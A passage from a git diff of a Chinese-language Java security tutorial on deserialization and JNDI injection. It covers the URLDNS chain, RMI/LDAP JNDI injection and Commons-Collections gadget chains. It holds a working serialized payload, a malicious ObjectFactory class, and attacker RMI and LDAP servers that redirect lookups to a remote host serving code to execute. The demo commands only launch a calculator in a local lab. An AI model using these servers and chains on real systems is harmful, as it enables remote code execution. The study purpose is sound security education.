@@ -3277,4 +3277,1111 @@ payload进行url编码后，访问
 ```
 http://localhost:8080/demo_war_exploded/deser?str=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj%2Fa3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE%2Bcr%2Bur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ%2BAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NgEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NjsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB%2BABgAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEVHSFZJSlRNcHcBAHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg%3D
 ```
+### （二）、URLDMNS链
 
+简介urldns链
+
+```
+URLDNS链是java原生态的一条利用链，通常用于存在反序列化漏洞进行验证的，因为是原生态，不存在什么版本限制。
+
+HashMap结合URL触发DNS检查的思路。
+
+在实际过程中可以首先通过这个去判断服务器是否使用了readObject()以及能否执行。
+
+之后再用各种gadget去尝试试RCE。
+```
+
+1、hashmap与url类的分析
+
+Hashmap类readObject方法的跟进,新建一个文件，写一个Hashmap，跟进去
+
+```java
+package com.example.demo;
+
+import java.util.HashMap;
+
+public class dns_hashmap {
+    public static void main(String[] args) {
+        HashMap
+    }
+}
+```
+
+<img width="702" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/72f99bd4-edf7-4a8b-98e2-477db01415f8">
+
+跟进hashmap
+
+<img width="784" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/8364f198-2b4f-456c-bb43-41e8bbe31580">
+
+找到Hashmap的readObject方法，该方法会在Hashmap类反序列化的时候自动调用
+
+<img width="720" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/bccf2d41-6646-4031-8b3e-4aad8d4b3189">
+
+继续向下，有一个hash(key)方法，先不管这个“key”，跟进去看看hash方法的内容，
+
+<img width="746" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b651cf98-c4e9-47c4-908d-9ebe494a329b">
+
+- 用 `putVal` 方法将键值对放入 `HashMap` 中。
+- `hash(key)` 方法计算键 `key` 的哈希值，确定它在 `HashMap` 中的存储位置。
+- `putVal` 方法将键值对放入哈希表中的对应位置，如果需要，会进行扩容并处理哈希冲突。
+
+<img width="641" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/da2e0567-7d91-43ba-9ab6-8ca18b3ee160">
+
+它是 `HashMap` 或 `Hashtable` 等哈希表数据结构中用于确定键的存储位置的方法之一
+
+```
+从这个参数定义，可以知道这个key是一个对象，
+
+当key不为空的情况下，就会调用key这个对象的hashcode方法，
+总结：Hashmap.readObject	--	HashMap.hash	--	传入对象得.hashCode
+```
+
+2、URL类hashcode方法的跟进
+
+继续新建一个url类，跟进去，也有一个hashcode方法，看下内容
+
+```
+package com.example.demo;
+
+//import java.util.HashMap;
+import java.net.URL;
+public class dns_hashmap {
+    public static void main(String[] args) {
+        URL
+    }
+}
+```
+
+跟进url，查看hashcode方法
+
+<img width="568" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/32288c6e-cc71-4c7b-a737-f6438963de39">
+
+当hashcode不等于 -1 的时候，直接返回hashcode的值，结束本函数，
+跟一下hashcode变量，发现其默认值为“-1”
+
+<img width="447" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/3291d3e2-99fe-449e-b9b8-0cb9db756dff">
+
+也就是，默认情况下会继续向下执行，不会直接返回hashcode的值，
+继续看下855行的代码“hashCode(this)”，这个“this”是一个url，而359行的getHostAddress函数要去解析这个url
+跟进
+
+<img width="640" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/9c34a3c2-a7ff-42ab-abbf-7871f9438d3a">
+
+ InetAddress类的getByName方法的作用是，传入host解析IP，返回ip。
+
+<img width="608" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/be551ea4-4b80-4d9d-ad88-d9ca8cdb9e6b">
+
+```
+小结下，
+
+URL.hashcode	--	URLStreamHandler.hashCode	-->	
+
+-->  URLStreamHandler.getHostAddress	--	InetAddress.getByName
+
+```
+
+3、InetAddress类的getByName方法
+
+创建一个InetAddress类的getByName方法
+
+```java
+package com.example.demo;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+
+public class main {
+
+    public static void main(String[] args) throws Exception {
+        try{
+            InetAddress address =InetAddress.getByName("baidu.com");
+            System.out.println(address.getHostAddress());
+        }catch(UnknownHostException e){
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+<img width="1070" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/060e6669-aa01-48a1-928a-b5cb6386fd4c">
+
+```
+小结
+传入域名会解析其对应的IP，我们可以在dns的解析记录找到，
+但是假设传入是IP，则没有地方可以找到受害者的解析记录
+```
+整个链路的分析
+
+```
+由上面总结就可以知道，Hashmap类在反序列化的时候，会调用传入对象的hashcode方法。
+
+而url类的hashcode方法会解析dns对应的IP；
+
+所以整个链接就是，
+Hashmap.readObject	--	HashMap.hash	-->
+	
+--> URL.hashcode（传入对象）  -->	URLStreamHandler.hashCode	-->
+
+--> URLStreamHandler.getHostAddress	--	InetAddress.getByName
+
+```
+
+由上面的结果推导出，最常见的触发demo代码，
+
+```java
+    package com.example.demo;
+
+    import java.net.MalformedURLException;
+    import java.net.URL;
+    import java.util.HashMap;
+
+    public class dns_hashmap {
+        public static void main(String[] args) throws MalformedURLException {
+            HashMap<URL,Integer> hashmap = new HashMap<>();
+          //创建了一个HashMap，其中键的类型是URL，值的类型是Integer
+            URL url = new URL("http://dd.l3eqkh.dnslog.cn/aa");
+            System.out.println(url);
+            System.out.println(url.getClass());
+            hashmap.put(url,2);
+          //将URL放入HashMap
+        }
+    }
+
+
+```
+
+###  （三）、JDNI注入以及rmi和Ldap的利用
+
+**1、Jndi、Ldap、Rmi协议**
+
+1.1、什么是ladp协议
+
+LDAP（Lightweight Directory Access Protocol）是一种用于访问和维护分布式目录信息的协议。
+
+1.2、jndi协议
+
+通过JNDI协议来操作（增删改查）LDAP服务中的数据
+
+```java
+jndi可以理解为java程序提供的一个统一的api接口，
+
+通过jndi我们不仅可以操作ldap服务中的数据，还可以联动操作其他的服务协议，
+
+比如：JDBC、LDAP、RMI、DNS、NIS、CORBA
+
+在这些协议中，安全从业者用的比较多的就是 LADP、RMI、DNS 
+```
+
+```
+但在 Java 中，JNDI 提供了便利的接口让我们更容易的使用 LDAP 和 DNS；
+
+但是LDAP、RMI和DNS都是可以不依赖JNDI而独立工作的
+```
+
+1.3、rmi协议
+
+```
+RMI（Remote Method Invocation）是Java语言中用于实现远程过程调用的机制。
+
+它允许在不同Java虚拟机（JVM）上运行的程序之间通过网络通信来进行方法调用和数据传输，
+
+实现分布式计算和远程服务调用。
+
+
+个人的理解就是我写好一些方法，放到网络服务上，大家不必关系这些方法具体是如何实现的，
+
+直接通过rmi协议加载调用即可，和一些web的api的功能类似。
+
+需要注意的是，RMI是Java特有的远程调用机制，它只适用于Java之间的通信。
+
+在现代的分布式系统中，
+
+更常见的做法是使用Web服务（如RESTful API和SOAP）或消息队列（如RabbitMQ和Apache Kafka）等跨平台、跨语言的远程调用方式。
+
+另外需要注意的就是，定义远程接口和实现都有一定的格式和要求
+
+```
+
+举例
+
+定义远程接口：
+
+```java
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface RemoteCalculator extends Remote {
+    int add(int a, int b) throws RemoteException;
+    int subtract(int a, int b) throws RemoteException;
+}
+//这两个方法定义了远程接口RemoteCalculator的方法签名。它们分别表示远程计算器可以执行的加法和减法操作
+```
+
+实现远程接口：
+
+```java
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class CalculatorImpl extends UnicastRemoteObject implements RemoteCalculator {
+
+    public CalculatorImpl() throws RemoteException {
+        // 构造函数需要抛出RemoteException
+    }
+
+    public int add(int a, int b) throws RemoteException {
+        return a + b;
+    }
+
+    public int subtract(int a, int b) throws RemoteException {
+        return a - b;
+    }
+}
+
+
+```
+
+服务器端：
+
+```java
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+    public static void main(String[] args) {
+        try {
+            // 创建远程对象
+            RemoteCalculator calculator = new CalculatorImpl();
+            // 启动RMI Registry，监听默认端口1099
+            Registry registry = LocateRegistry.createRegistry(1099);
+            // 将远程对象绑定到RMI Registry上，客户端将通过该名称来查找远程对象
+            registry.rebind("Calculator", calculator);
+            System.out.println("服务器已启动...");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+客户端：
+
+```java
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIClient {
+    public static void main(String[] args) {
+        try {
+            // 连接到RMI Registry
+            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
+
+            // 在RMI Registry中查找远程对象
+            RemoteCalculator calculator = (RemoteCalculator) registry.lookup("Calculator");
+
+            // 调用远程方法
+            int resultAdd = calculator.add(10, 5);
+            int resultSubtract = calculator.subtract(10, 5);
+
+            System.out.println("10 + 5 = " + resultAdd);
+            System.out.println("10 - 5 = " + resultSubtract);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+```
+在这个例子中，我们创建了一个简单的RMI服务器和客户端。
+	
+服务器端创建了CalculatorImpl对象，并将其绑定到RMI Registry上。
+
+客户端通过RMI Registry查找到Calculator对象，并调用其中的远程方法进行计算。
+
+这样，客户端就可以在远程调用的帮助下执行服务器端的方法，并获得计算结果。
+
+```
+
+**2、jndi注入**
+
+```
+JNDI 注⼊，即当开发者在定义 JNDI 接⼝初始化时，lookup() ⽅法的参数可控，
+
+攻击者就可以将恶意的url 传⼊参数远程加载恶意载荷，造成注⼊攻击。
+```
+
+其中使用ladp协议多，rmi协议用的少是因为高版本默认不能直接使用rmi协议
+```
+package com.example.demo;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class jndi {
+    public static void main(String[] args) throws NamingException {
+        String uri = "rmi://127.0.0.1:1099/Exploit"; //包含了一个RMI（远程方法调用）服务的地址     
+        InitialContext initialContext = new InitialContext();   
+      //它允许在命名服务中执行查询操作。这个对象将被用来查找和访问命名服务
+        initialContext.lookup(uri);   //查找指定URI对应的对象                        
+    }
+}
+```
+
+<img width="748" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/de61d06f-029e-40a7-8dc7-adcaa0f6e631">
+
+rmi协议的利用
+
+
+先说下rmi协议的利用，需要注意的是
+当前的jdk版本是 jdk112，jdk113以后 不存在此漏洞 ⼤多数⽤ldap协议攻击
+更换idea的执行jdk版本,先加载几个jdk的版本到idea，然后修改项目执行的jdk版本，
+
+idea--文件---项目结构---SDK----选择一个jdk8
+
+<img width="1024" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/299b0cdc-cf6d-4a75-baca-c030241dba06">
+
+生成恶意class文件payload
+注意，这个exp，不要放在这种“com.example.demo”包内，
+
+<img width="1261" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/bccb47d5-29b9-4575-a575-21999c3fb745">
+
+```java
+package com.test.test;
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
+
+public class jndiexp implements ObjectFactory {
+    static {
+        try {
+            Runtime.getRuntime().exec("open -a Calculator");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        return null;
+    }
+}
+```
+
+```java
+这段代码是Java的JNDI（Java Naming and Directory Interface）服务的API的一部分。
+
+1. `public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception`：
+这是一个公开的方法，它名叫`getObjectInstance`，返回一个类型为Object的对象，这是所有Java对象类型的基类。 
+
+2. 函数的参数： 
+- `obj`是一个对象实例，它将作为转换或查找的目标。
+- `name`则是一个JNDI名字实例，它表示需要查找的对象的名字。
+- `nameCtx`是一个命名的上下文，它提供了查找对象所需要的环境。
+- `environment`则是一个哈希表，它装载了一组环境属性，用以影响查找操作。
+
+3. 方法的功能：
+这个函数的主要功能是从JNDI命名服务中获取一个对象，旨在查找在JNDI注册的对象。例如，可能是在EJB或者在Web应用开发中查找注册在JNDI树结构中的对象。
+
+4. 方法返回的结果： 
+方法返回一个Object类型的对象。如果找不到对象，此方法返回null。
+
+5. `throws Exception`：
+这个表示方法在执行过程中可能会抛出异常，方法调用时需要处理这个异常。
+
+6. 这段代码只是一个函数的框架，它并没有实际的实现。在实际使用中，需要根据实际的需求来实现这个函数。
+
+注意：ObjectFactory接口的getObjectInstance方法，是抽象方法，子类需要覆盖此方法，以提供自定义的对象工厂实现。
+```
+
+右击选择“重新构建”，选择“构建模块”的话，仅仅会在第一次生成class文件，
+
+假设删除这个class文件，在“构建模块”就不会重新生成class文件，“重新构建”就ok
+
+生成的class文件在这个target文件夹内可以找到
+
+然后将这个生成的class文件放到kali机器上，开启http服务等待受害者机器来请求
+
+```
+黑客准备的恶意rmi服务，java文件   RMI_Hack_Server.java
+
+将上面生成的class文件放到了另一个kali机器上，这个Reference函数的第一个参数任意写，
+
+第二个参数就是上面class文件的名称（不用加.class）；第三个参数是class文件的http地址
+```
+
+```java
+package com.example.demo2;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMI_Hack_Server {
+    public static void main(String[] args) throws Exception {
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true ");
+        //监听RMI服务端⼝
+        Registry registry = LocateRegistry.createRegistry(7778);
+         创建⼀个远程的JNDI对象⼯⼚类的引⽤对象      第一个参数任意写
+        Reference reference = new Reference("jndiexp", "jndiexp", "http://192.168.1.27:8081/");
+        // 转换为RMI引⽤对象,
+        // 因为Reference没有实现Remote接⼝也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中⼼，
+        // 所以需要使⽤ReferenceWrapper对Reference的实例进⾏⼀个封装。
+        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
+        //绑定⼀个恶意的Remote对象到RMI服务
+        registry.bind("exp", wrapper);
+    }
+}
+
+
+```
+
+受害者的业务代码. Rmi_Target_Server.java
+
+```java
+package com.example.demo;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+
+public class Rmi_Target_Server  {
+    public static void main(String[] args) throws NamingException, NamingException {
+        String uri = "rmi://127.0.0.1:7778/exp";
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
+        //初始化上下⽂
+        InitialContext initialContext = new InitialContext();
+        // 获取RMI绑定的恶意ReferenceWrapper对象
+        initialContext.lookup(uri);
+    }
+}
+
+
+```
+
+总结
+
+```
+rmi客户端（目标服务器）需要请求一个rmi服务器（hacker搭建的），
+
+只能拿到一个要执行函数名称yy和这个函数的地址xx
+
+然后rmi客户端在请求http://xx/yy拿到最终的恶意代码，然后执行
+
+
+rmi服务器就不能返回“最终的恶意代码”，这个和整个rmi服务架构设计的流程有关
+
+rmi服务器的作用就是返回“要执行的函数名称”和这个函数在哪里
+
+
+而对于 LDAP 协议，攻击者同样可以在恶意服务器上创建恶意的 LDAP 资源，
+
+例如恶意的 LDAP 对象或恶意的 LDAP URL。当客户端执行 JNDI 查询时，
+
+会连接到恶意的 LDAP 服务器，并获取恶意资源。
+
+
+在这两种协议中，恶意的服务器充当了 "资源指向" 的角色，
+
+将客户端的查询请求指向恶意资源。客户端不知情地获取到了恶意的资源，
+
+并在后续操作中可能触发恶意代码的执行。
+
+```
+
+**ladp协议利用**
+
+先配置环境pom.xml
+
+```xml
+        <dependency>
+            <groupId>com.unboundid</groupId>
+            <artifactId>unboundid-ldapsdk</artifactId>
+            <version>6.0.8</version>
+        </dependency>
+
+```
+
+修改pom文件之后，重新构造项目本地还会在生成jndiexp.class文件,而本地有这个文件，服务器就不会去远程读取，记得删除这个生成的文件.
+
+ldap_Hack_server.java
+
+```java
+package com.example.demo;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+public class ldap_Hack_server {
+    private static final String LDAP_BASE = "dc=example,dc=com";
+    public static void main ( String[] tmp_args ) {
+        String[] args=new String[]{"http://192.168.1.27:8081/#jndiexp"};
+        int port = 7777;
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    "listen", //$NON-NLS-1$
+                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+            ds.startListening();
+
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+        private URL codebase;
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult
+                                                  result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+        }
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+            e.addAttribute("javaClassName", "foo");
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos > 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+            e.addAttribute("javaCodeBase", cbstring);
+            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("javaFactory", this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
+```
+
+ldap_target_Server.java
+
+```java
+package com.example.demo;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+public class ldap_target_Server {
+    public static void main(String[] args) throws NamingException {
+        InitialContext initialContext = new InitialContext();
+        initialContext.lookup("ldap://127.0.0.1:7777/Exp");
+    }
+}
+```
+
+dns探测
+
+```java
+package com.example.demo2;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+public class ldap_target_Server {
+    public static void main(String[] args) throws NamingException {
+        InitialContext initialContext = new InitialContext();
+        //initialContext.lookup("ldap://127.0.0.1:7777/Exp");
+        initialContext.lookup("dns://dns.y6u1ft.dnslog.cn");
+    }
+}
+```
+
+### （四）、CC3链
+
+Apache commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java开源组件相继都爆出反序列化漏洞。CC链的原理就是**利用反射获取类**，放到**readObject**方法
+
+在挖掘反序列化漏洞时比较常用的利用工具ysoserial就使用LazyMap类的利用链，接下来我们学习LazyMap类的利用链。
+
+1、相关知识介绍
+
+**InvokerTransformer**继承自Transformer类， 这个类有一个函数叫transform，它的作用很简单，会把当前类的iMethodName和iParamTypes进行反射调用。
+
+```java
+public object transform(object input) {
+    // 检查输入对象是否为 null
+    if (input != null) {
+        return null; // 如果是 null，则返回 null
+
+        // 尝试进行方法调用
+        try {
+            // 获取输入对象的类
+            Class cls = input.getClass();
+
+            // 获取指定名称和参数类型的方法
+            Method method = cls.getMethod(imethodname, iparamtypes);
+
+            // 调用获取的方法
+            return method.invoke(input, iargs);
+        } catch (NoSuchMethodException ex) {
+            // 捕获方法不存在的异常
+            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
+                "' on '" + input.getClass() + "' does not exist");
+        } catch (IllegalAccessException ex) {
+            // 捕获无法访问方法的异常
+            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
+                "' on '" + input.getClass() + "' cannot be accessed");
+        } catch (InvocationTargetException ex) {
+            // 捕获方法调用抛出的异常
+            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
+                "' on '" + input.getClass() + "' threw an exception");
+        }
+    } else {
+        // 输入对象为 null，直接返回 null
+        return null;
+    }
+}
+
+```
+
+2、案例1-利用反射机制调用runtime.exec方法执行命令
+
+```java
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class CC1Test {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
+        //获取类
+        Class runtimeClazz = Class.forName("java.lang.Runtime");
+        Method getRuntimeMethod = runtimeClazz.getMethod("getRuntime");
+
+        //获取类实例
+        Runtime singleRuntime = (Runtime)getRuntimeMethod.invoke(null);
+
+        //获取exec方法
+        Method execMethod = runtimeClazz.getDeclaredMethod("exec", String.class);
+
+        //反射执行
+        execMethod.invoke(singleRuntime, "calc");
+    }
+}
+```
+
+3、案例2- 利用Transformer调用EXEC函数
+
+为了能顺利的通过Transformer的transform调用Exec函数，我们构造如下代码 
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import java.lang.reflect.Field;
+
+public class CC1Test2 {
+    public static void main(String[] args) {
+        // 创建一个ChainedTransformer对象
+        ChainedTransformer transformerChain = new ChainedTransformer();
+
+        // 创建一个ConstantTransformer对象
+        Transformer constantTransformer = new ConstantTransformer(1);
+
+        // 将ConstantTransformer对象添加到ChainedTransformer对象中
+        transformerChain.addTransformer(constantTransformer);
+
+        // 创建一个恶意的Transformer数组
+        Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {
+                String.class, Class[].class }, new Object[] {
+                "getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {
+                Object.class, Object[].class }, new Object[] {
+                null, new Object[0] }),
+            new InvokerTransformer("exec",
+                new Class[] { String.class }, new String[]{"calc"}),
+            new ConstantTransformer(1)
+        };
+
+        try {
+            // 使用反射尝试修改ChainedTransformer对象中私有字段iTransformers的值
+            Class<?> chainedTransformerClass = Class.forName("org.apache.commons.collections.functors.ChainedTransformer");
+            Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
+            iTransformers.setAccessible(true);
+            iTransformers.set(transformerChain, transformers);
+
+            // 触发恶意链执行
